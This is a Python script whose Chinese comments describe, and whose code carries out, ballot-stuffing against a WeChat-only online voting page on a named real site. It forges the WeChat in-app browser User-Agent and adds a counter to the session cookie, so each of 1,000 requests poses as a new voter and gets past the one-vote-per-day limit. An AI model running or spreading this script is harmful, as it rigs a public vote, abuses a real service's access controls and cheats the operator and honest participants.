# coding=utf-8
"""
需求：微信投票限制只能在微信里投票且每个微信号每天只能投一次
分析：只能在微信投票是通过判断UA是否包含微信内置浏览器MicroMessenger实现,每个微信号每天限投一次是通过判断用户的Cookie值实现
解决：通过fiddler手机数据抓包获取请求url,User-Agent,Cookie,模拟微信发送请求并手动更改Cookie值伪装成不同用户突破只能投一票限制
fiddler配置链接：https://www.cnblogs.com/qinyulin/articles/6843829.html
"""

import requests


def vote(i):
    # 请求地址
    url = "http://hd.konglongcheng.com.cn/HD2018/EXVote/EXVoteHelper.ashx?action=vote&Id=155"
    # 请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 MicroMessenger/6.7.4(0x1607042c) NetType/WIFI Language/zh_CN",
        "Cookie": "comm_hd_cookie=oZCrNjtRiwIwiYmhQ4evBHB7S3zQ" + str(i),
        "Referer": "http://hd.konglongcheng.com.cn/HD2018/EXVote/index.aspx?txt=155",
        "Host": "hd.konglongcheng.com.cn",
    }
    # 发送get请求
    response = requests.get(url, headers=headers)
    # 查看响应数据
    print(response.text)


if __name__ == '__main__':
    for i in range(1000):
        vote(i)